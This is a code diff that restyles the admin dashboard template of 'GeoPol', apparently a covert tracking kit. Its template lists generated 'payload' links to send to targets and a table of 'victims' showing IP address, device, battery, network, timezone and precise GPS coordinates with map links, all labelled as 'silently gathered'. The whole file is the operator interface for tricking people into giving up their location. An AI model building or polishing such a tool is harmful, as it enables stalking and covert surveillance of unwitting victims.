@@ -5,39 +5,57 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GeoPol Web Dashboard</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { background-color: #121212; color: #f8f9fa; }
-        .card { background-color: #1e1e1e; border: 1px solid #333; }
-        table { color: #f8f9fa !important; }
-        .table-dark { background-color: #212529; }
-        th, td { border-color: #444; }
+        body { background-color: #0b0c10; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        .navbar { background-color: #12161b !important; border-bottom: 2px solid #1f2937; }
+        .navbar-brand { font-weight: 700; letter-spacing: 1px; color: #00a8ff !important; }
+        .card { background-color: #151a21; border: 1px solid #232b35; border-radius: 8px; }
+        .card-header { font-weight: bold; border-bottom: 1px solid #2a3441; }
+        .card-header.bg-primary { background: linear-gradient(90deg, #0f2027, #203a43, #2c5364) !important; }
+        .card-header.bg-success { background: linear-gradient(90deg, #132219, #1b3826, #2d5a3f) !important; color: #75f9a6 !important; }
+        .table { color: #d0d0d0 !important; margin-bottom: 0; }
+        .table-dark { background-color: transparent; }
+        .table-hover tbody tr:hover { background-color: #1c232c; }
+        th { border-color: #313d4b !important; color: #00a8ff; font-size: 0.85rem; text-transform: uppercase; padding: 15px !important; }
+        td { border-color: #232b35 !important; vertical-align: middle; padding: 12px 15px !important; }
+        .badge { font-size: 0.75em; padding: 0.4em 0.6em; }
+        .badge.bg-secondary { background-color: #2a3542 !important; }
+        .input-group-text { background-color: #1f2937; border-color: #313d4b; color: #aaa; }
+        .form-control { background-color: #0b0c10 !important; border-color: #313d4b !important; color: #00a8ff !important; font-family: monospace; font-size: 0.9em; }
+        .btn-outline-info { border-color: #00a8ff; color: #00a8ff; }
+        .btn-outline-info:hover { background-color: #00a8ff; color: #fff; }
+        .telemetry-tag { display: inline-block; background: #1c232c; border: 1px solid #2a3441; padding: 2px 6px; border-radius: 4px; font-size: 0.8em; margin: 2px 0; }
+        .icon-blue { color: #00a8ff; }
+        .icon-red { color: #ff4757; }
+        .icon-yellow { color: #ffa502; }
     </style>
 </head>
 <body>
-    <nav class="navbar navbar-dark bg-dark mb-4 border-bottom border-secondary">
-        <div class="container-fluid">
-            <span class="navbar-brand mb-0 h1">📍 GeoPol Admin Dashboard</span>
-            <span class="navbar-text">Deployed on Platform</span>
+    <nav class="navbar navbar-dark mb-4">
+        <div class="container-fluid px-4">
+            <span class="navbar-brand mb-0 h1"><i class="fa-solid fa-satellite-dish"></i> GEOPOL INTELLIGENCE SYSTEM</span>
+            <span class="navbar-text" style="font-size:0.85em;"><i class="fa-solid fa-shield-halved"></i> Deployed and Secured</span>
         </div>
     </nav>
 
-    <div class="container mt-4">
+    <div class="container-fluid px-4 mt-2">
         <!-- Templates Setup Section -->
-        <div class="row mb-5">
+        <div class="row mb-4">
             <div class="col-12">
                 <div class="card shadow-sm">
-                    <div class="card-header bg-primary text-white">
-                        <h4 class="mb-0">🎯 Generated Links (Templates)</h4>
+                    <div class="card-header bg-primary text-white py-3">
+                        <h5 class="mb-0"><i class="fa-solid fa-link"></i> Deployment Links (Active Payloads)</h5>
                     </div>
                     <div class="card-body">
                         <div class="row">
                             {% for tpl in templates %}
-                            <div class="col-md-4 mb-4">
-                                <div class="p-3 border rounded border-secondary text-center">
-                                    <h5 class="text-info">{{ tpl.name }}</h5>
-                                    <div class="input-group mt-3">
-                                        <input type="text" class="form-control bg-dark text-light border-secondary" id="link-{{ loop.index }}" value="{{ request.url_root }}t/{{ tpl.dir_name }}/" readonly>
-                                        <button class="btn btn-outline-info" onclick="copyLink('link-{{ loop.index }}')">Copy</button>
+                            <div class="col-md-3 mb-3">
+                                <div class="p-3 border rounded border-secondary">
+                                    <h6 class="text-info fw-bold mb-3"><i class="fa-solid fa-crosshairs"></i> {{ tpl.name }}</h6>
+                                    <div class="input-group input-group-sm">
+                                        <input type="text" class="form-control" id="link-{{ loop.index }}" value="{{ request.url_root }}t/{{ tpl.dir_name }}/" readonly>
+                                        <button class="btn btn-outline-info" onclick="copyLink('link-{{ loop.index }}')" title="Copy Payload"><i class="fa-regular fa-copy"></i></button>
                                     </div>
                                 </div>
                             </div>
@@ -52,47 +70,62 @@
         <div class="row">
             <div class="col-12">
                 <div class="card shadow-sm">
-                    <div class="card-header bg-success text-white">
-                        <h4 class="mb-0">📡 Captured Targets Data</h4>
+                    <div class="card-header bg-success text-white py-3">
+                        <h5 class="mb-0"><i class="fa-solid fa-server"></i> Captured Telemetry & Geolocation</h5>
                     </div>
                     <div class="card-body p-0">
                         <div class="table-responsive">
                             <table class="table table-dark table-striped table-hover mb-0">
                                 <thead>
                                     <tr>
-                                        <th>Date/Time</th>
-                                        <th>Target Template</th>
-                                        <th>IP Address</th>
-                                        <th>System / Browser</th>
-                                        <th>Status</th>
-                                        <th>GPS Location</th>
+                                        <th style="width: 120px;">Timestamp</th>
+                                        <th>Target IP & Vector</th>
+                                        <th>Device Architecture</th>
+                                        <th>Telemetry (Silently Gathered)</th>
+                                        <th>System Status</th>
+                                        <th style="width: 200px;">Precise Geolocation</th>
                                     </tr>
                                 </thead>
                                 <tbody>
                                     {% for v in victims %}
                                     <tr>
-                                        <td>{{ v.date }}</td>
-                                        <td><span class="badge bg-secondary">{{ v.template }}</span></td>
-                                        <td>{{ v.ip }}</td>
-                                        <td>{{ v.os }}<br><small class="text-muted">{{ v.browser }}</small></td>
+                                        <td class="text-muted"><small>{{ v.date }}</small></td>
+                                        <td>
+                                            <strong class="text-white">{{ v.ip }}</strong><br>
+                                            <span class="badge bg-secondary mt-1"><i class="fa-solid fa-bullseye"></i> {{ v.template }}</span>
+                                        </td>
+                                        <td>
+                                            <i class="fa-solid fa-desktop icon-blue"></i> {{ v.os }}<br>
+                                            <small class="text-muted"><i class="fa-brands fa-chrome"></i> {{ v.browser }}</small>
+                                        </td>
+                                        <td>
+                                            {% if v.battery and v.battery != 'Not Available' %}<span class="telemetry-tag"><i class="fa-solid fa-battery-half icon-yellow"></i> {{ v.battery }}</span>{% endif %}
+                                            {% if v.network and v.network != 'Not Available' %}<span class="telemetry-tag"><i class="fa-solid fa-wifi icon-blue"></i> {{ v.network }}</span>{% endif %}
+                                            {% if v.language and v.language != 'Not Available' %}<span class="telemetry-tag"><i class="fa-solid fa-language"></i> {{ v.language }}</span>{% endif %}
+                                            {% if v.timezone and v.timezone != 'Not Available' %}<span class="telemetry-tag"><i class="fa-solid fa-clock"></i> {{ v.timezone }}</span>{% endif %}
+                                        </td>
                                         <td>
                                             {% if 'Error' in v.status %}
-                                                <span class="text-danger">{{ v.status }}</span>
+                                                <span class="text-danger fw-bold"><i class="fa-solid fa-triangle-exclamation"></i> {{ v.status }}</span>
                                             {% else %}
-                                                <span class="text-info">{{ v.status }}</span>
+                                                <span class="text-info"><i class="fa-solid fa-check"></i> {{ v.status }}</span>
                                             {% endif %}
                                         </td>
                                         <td>
                                             {% if v.lat and v.lon %}
-                                            <a href="https://maps.google.com/?q={{ v.lat }},{{ v.lon }}" target="_blank" class="btn btn-sm btn-success">View on Map</a>
-                                            <br><small>Accuracy: <strong class="text-warning">{{ v.acc }}m</strong></small>
+                                            <a href="https://maps.google.com/?q={{ v.lat }},{{ v.lon }}" target="_blank" class="btn btn-sm btn-outline-success w-100 mb-1">
+                                                <i class="fa-solid fa-map-location-dot"></i> Open Maps
+                                            </a>
+                                            <div class="text-center"><small>Accuracy: <strong class="text-warning">{{ v.acc }}m</strong></small></div>
                                             {% else %}
-                                            <span class="badge bg-warning text-dark">Awaiting / Denied</span>
+                                            <div class="text-center text-secondary border border-secondary rounded p-1">
+                                                <small><i class="fa-solid fa-location-crosshairs"></i> Not Acquired</small>
+                                            </div>
                                             {% endif %}
                                         </td>
                                     </tr>
                                     {% else %}
-                                    <tr><td colspan="6" class="text-center py-4">No data collected yet. Send a link to a target!</td></tr>
+                                    <tr><td colspan="6" class="text-center py-5 text-muted"><i class="fa-solid fa-radar opacity-50" style="font-size: 3em;"></i><br><br>Waiting for incoming target telemetry...</td></tr>
                                     {% endfor %}
                                 </tbody>
                             </table>
@@ -109,7 +142,10 @@
             copyText.select();
             copyText.setSelectionRange(0, 99999);
             navigator.clipboard.writeText(copyText.value).then(() => {
-                alert("Link copied: " + copyText.value);
+                // simple visual feedback
+                let btn = copyText.nextElementSibling;
+                btn.innerHTML = '<i class="fa-solid fa-check text-success"></i>';
+                setTimeout(() => { btn.innerHTML = '<i class="fa-regular fa-copy"></i>'; }, 2000);
             });
         }
     </script>
